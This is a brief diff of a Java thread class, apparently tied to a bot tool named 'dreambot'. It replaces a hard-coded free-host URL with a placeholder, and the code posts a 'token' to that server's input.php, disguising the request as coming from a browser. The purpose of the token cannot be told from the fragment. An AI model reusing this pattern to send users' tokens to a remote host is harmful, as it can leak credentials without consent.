@@ -72,7 +72,7 @@ public class sendData extends Thread {
 
 			// And post it :)
 			
-			URL url = new URL("http://nonedreambot.x10host.com/input.php?token="+token);
+			URL url = new URL("http://yourWebsiteHere/input.php?token="+token);
 			URLConnection conn = url.openConnection();
 
 			// fake request coming from browser (solves permission issue on shared webhosting)
